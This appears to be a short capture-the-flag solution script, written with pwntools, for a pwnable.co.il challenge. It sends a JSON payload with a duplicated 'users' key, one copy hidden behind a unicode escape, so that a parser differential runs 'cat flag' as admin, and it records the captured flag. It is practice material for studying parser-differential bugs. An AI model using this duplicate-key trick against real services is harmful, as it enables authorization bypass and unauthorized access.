from pwn import *

def main():
    ### run ###
    p = remote("pwnable.co.il", 9023)

    ### payload start ###
    payload = b'{"cmds": ["cat"],    "args": [["flag"]], "users": ["admin"], "\u0075sers": ["user1"]}'
    p.sendline(payload)
    print(p.recvall().decode())

if __name__ == "__main__":
    main()

#flag: PWNIL{1_h4t3_pars3r_d1ffs}
